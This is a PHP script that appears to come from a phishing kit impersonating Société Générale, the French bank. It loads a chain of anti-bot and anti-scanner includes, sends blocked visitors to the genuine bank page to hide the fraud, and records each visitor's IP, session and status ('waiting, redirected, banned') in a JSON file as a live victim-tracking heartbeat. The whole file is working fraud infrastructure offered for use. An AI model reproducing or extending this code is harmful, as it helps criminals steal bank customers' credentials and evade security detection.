<?php
error_reporting(0);
set_time_limit(0);
session_start();
include ('../prevents/bots.php');
include ('../prevents/antimar.php');
include ('../prevents/banned-ip.php');
	include ('../prevents/anti1.php');
	include ('../prevents/anti2.php');
	include ('../prevents/anti3.php');
	include ('../prevents/anti4.php');
	include ('../prevents/anti5.php');
	include ('../prevents/anti6.php');
	include ('../prevents/anti7.php');
	include ('../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}



$ip = $_SERVER['REMOTE_ADDR'];
$vid = isset($_SESSION['vid']) ? $_SESSION['vid'] : 'anonymous';

$filepath = 'active_users.json';

// Charger les utilisateurs actifs
$users = file_exists($filepath) ? json_decode(file_get_contents($filepath), true) : [];

// Mettre à jour ou ajouter l’utilisateur
$users[$ip] = [
    'vid' => $vid,
    'last_seen' => time(),
    'status' => $users[$ip]['status'] ?? 'waiting' // waiting, redirected, banned...
];

// Enregistrer les données
file_put_contents($filepath, json_encode($users, JSON_PRETTY_PRINT));

echo json_encode(['status' => 'pong']);
?>
